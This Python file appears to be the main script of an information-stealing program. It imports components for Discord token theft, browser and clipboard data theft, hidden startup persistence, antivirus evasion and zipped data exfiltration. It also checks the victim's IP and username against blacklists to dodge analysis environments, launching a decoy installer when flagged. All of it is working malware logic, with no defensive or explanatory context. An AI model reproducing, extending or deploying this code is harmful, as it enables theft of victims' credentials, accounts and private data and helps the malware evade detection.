import time, requests, threading, sys, os
from components.wtoken import DiscordToken
from browsers.browserinfo import getinfo
from components.zipandsend import zipnsend
from components.info import sendinfo
from components.clipboard import steal_data
from components.startup import hiddenstartup
from components.confirmsend import confirmsend
from components.antiantivirus import antiantivirus
from blacklist.ips import blacklisted_ips
from blacklist.names import badnames
from decoy.install import install

def check_blacklist():
    user_ip = requests.get('https://api.ipify.org').text
    user_name = os.popen('whoami').read().strip().split("\\")[-1].replace(' ', '').lower()
    if user_ip in blacklisted_ips or user_name in [name.lower() for name in badnames]:
        install()
        sys.exit()
    return True

def browser_tasks():
    threads = [
        threading.Thread(target=getinfo),
        threading.Thread(target=hiddenstartup),
        threading.Thread(target=steal_data),
    ]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
if check_blacklist():
    antiantivirus()
    sendinfo()
    browser_tasks()
    confirmsend()
    time.sleep(1.1)
    zipnsend()
    DiscordToken()
